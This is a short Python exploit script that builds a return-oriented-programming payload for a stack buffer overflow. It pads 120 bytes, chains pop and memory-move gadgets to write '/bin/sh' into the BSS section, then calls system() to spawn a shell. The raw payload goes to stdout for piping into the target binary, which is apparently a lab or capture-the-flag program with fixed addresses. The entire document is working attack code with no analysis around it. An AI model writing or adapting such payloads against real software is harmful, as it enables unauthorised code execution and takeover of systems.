import sys

SYSTEM_ADDR = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
BINSH = b"/bin/sh\x00"

BSS1 = b"\x00\x00\x00\x00\x00\x40\x40\x30"[::-1]
BSS2 = b"\x00\x00\x00\x00\x00\x40\x40\x50"[::-1]

MEM_MOVE = b"\x00\x00\x00\x00\x00\x40\x11\x5a"[::-1]
POP_RDX = b"\x00\x00\x00\x00\x00\x40\x11\x5e"[::-1]
POP_RAX = b"\x00\x00\x00\x00\x00\x40\x11\x60"[::-1]
POP_RDI = b"\x00\x00\x00\x00\x00\x40\x11\x62"[::-1]

LOC_TO_RET = 120
GARBAGE = b"A" * LOC_TO_RET

PAYLOAD = GARBAGE
# write /bin/sh to BSS
PAYLOAD += POP_RAX
PAYLOAD += BINSH
PAYLOAD += POP_RDX
PAYLOAD += BSS1
PAYLOAD += MEM_MOVE
# put into rdi
PAYLOAD += POP_RDI
PAYLOAD += BSS1
# call system
PAYLOAD += SYSTEM_ADDR

#  PAYLOAD += SYSTEM_ADDR

sys.stdout.buffer.write(PAYLOAD)
